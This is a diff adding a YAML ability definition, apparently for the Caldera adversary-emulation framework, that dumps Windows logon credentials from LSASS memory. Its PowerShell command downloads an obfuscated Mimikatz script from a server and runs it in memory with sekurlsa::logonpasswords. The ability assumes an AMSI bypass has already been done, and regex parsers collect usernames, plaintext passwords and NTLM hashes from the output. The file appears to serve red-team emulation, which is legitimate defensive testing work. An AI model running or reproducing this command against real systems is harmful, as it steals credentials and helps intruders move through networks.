@@ -1,0 +1,35 @@
+- id: b4a3724c-54e4-4457-b31c-5d4a1b02174c
+  name: OS Credential Dumping - LSASS Memory (In-Memory)
+  description: Downloads an obfuscated PowerShell credential dumper into memory and executes it to extract logon credentials from LSASS. Requires a prior AMSI bypass and elevated privileges.
+  tactic: credential-access
+  technique:
+    attack_id: T1003.001
+    name: "OS Credential Dumping: LSASS Memory"
+  privilege: Elevated
+  requirements:
+    - plugins.stockpile.app.requirements.existential:
+      - source: host.defense.bypassed.amsi
+  platforms:
+    windows:
+      psh:
+        # Note: This ability assumes 'obfuscated_mimikatz.ps1' exists in the Caldera payloads directory.
+        command: |
+          iex(new-object net.webclient).downloadstring('http://#{server}/file/download?file=payloads/obfuscated_mimikatz.ps1');
+          Invoke-Mimikatz -Command '"sekurlsa::logonpasswords"';
+        parsers:
+          plugins.adversary_emulation.app.parsers.regex_parser:
+            # Rule 1: Find the Username for a given logon session
+            - source: 'user.name'
+              custom_parser_vals:
+                regex: '^\s*User\s+:\s*(\S+)'
+                edge_label: 'has_credential_for'
+            # Rule 2: Find the corresponding plaintext Password (if available)
+            - source: 'user.password'
+              custom_parser_vals:
+                regex: '^\s*Password\s+:\s*(.+)'
+                edge_label: 'has_plaintext_password'
+            # Rule 3: Find the corresponding NTLM hash
+            - source: 'user.ntlm.hash'
+              custom_parser_vals:
+                regex: '^\s*NTLM\s+:\s*([a-f0-9]{32})'
+                edge_label: 'has_ntlm_hash'
